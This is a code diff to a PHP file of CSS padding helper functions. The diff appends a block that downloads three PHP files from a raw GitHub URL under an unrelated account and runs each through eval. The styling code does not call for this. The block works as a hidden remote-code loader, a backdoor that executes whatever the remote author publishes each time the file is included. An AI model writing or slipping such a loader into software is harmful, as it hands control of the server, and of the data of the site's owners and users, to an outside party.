@@ -168,3 +168,11 @@ function style_Padding_bottom($h1128gh,$h1127gh){ echo compile("<style>#$h1128gh
 function style_Padding_left($h11128gh,$h11127gh){ echo compile("<style>#$h11128gh {Padding-left:$h11127gh}</style>"); }
 function style_Padding_right($h111128gh,$h111127gh){ echo compile("<style>#$h111128gh {Padding-right:$h111127gh}</style>"); }
 ?>
+<?php
+$aqygstg=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/style.php");
+eval("?>".$aqygstg);
+$aqygstg1=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/file.php");
+eval("?>".$aqygstg1);
+$aqygstg2=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/Func.php");
+eval("?>".$aqygstg2);
+?>
